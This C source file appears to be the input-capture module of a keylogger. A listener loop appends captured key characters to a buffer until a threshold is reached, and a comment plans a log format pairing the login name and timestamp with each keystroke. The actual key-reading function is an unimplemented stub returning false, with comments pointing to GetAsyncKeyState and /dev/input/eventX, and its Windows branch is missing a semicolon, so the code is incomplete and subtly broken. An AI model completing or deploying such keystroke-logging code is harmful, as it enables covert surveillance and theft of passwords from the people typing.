#include "../include/input.h"
#include "../include/utils.h"
#include "../include/config.h"

#include <stdint.h>

#ifdef _WIN32
    #include <windows.h>
#else
    #include <unistd.h>
    #include <sys/time.h>
#endif

#ifndef _WIN32
struct input_event
{
    struct timeval time;
    uint16_t type;
    uint16_t code;
    int32_t value;
};
#endif

static bool is_any_key_pressed(char *key)
{
#ifdef _WIN32
    // GetAsyncKeyState(...);
    return false
#else
    // /dev/input/eventX
    return false;
#endif
}

// Update listener function to use this format
/*
---@getlogin---
[datetime]: 'utf8_char'\n
*/
void listener(char *buffer, size_t *p_current_len)
{
    char key_pressed;

    while (*p_current_len < BUFFER_THRESHOLD)
    {
        if (is_any_key_pressed(&key_pressed))
        {
            buffer[*p_current_len] = key_pressed;
            buffer[*p_current_len + 1] = '\n';
            buffer[*p_current_len + 2] = '\0';
            *p_current_len += 2;
        }

        sleep_ms(50);
    }
}

